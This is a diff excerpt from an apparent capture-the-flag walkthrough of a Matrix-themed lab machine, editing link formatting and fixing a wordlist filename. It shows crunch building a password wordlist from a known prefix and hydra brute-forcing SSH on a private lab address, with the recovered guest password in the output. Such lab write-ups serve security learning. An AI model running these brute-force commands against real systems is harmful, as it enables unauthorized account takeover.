@@ -32,12 +32,12 @@ echo "Then you'll see, that it is not the spoon that bends, it is only yourself.
 > 
 > *Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.*
 
-**Generate wordlist with *crunch* & bruteforce SSH with *hydra***
+**Generate wordlist with [[Crunch]] & bruteforce SSH with [[Hydra]]**
 
 ```bash
 └─$ crunch 8 8 -t k1ll0r@@ -o wordlist.txt -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space
 
-└─$ hydra -l guest -P matrix.txt ssh://192.168.5.104:22
+└─$ hydra -l guest -P wordlist.txt ssh://192.168.5.104:22
 [22][ssh] host: 192.168.5.104  login: guest password: k1ll0r7n
 ```
 
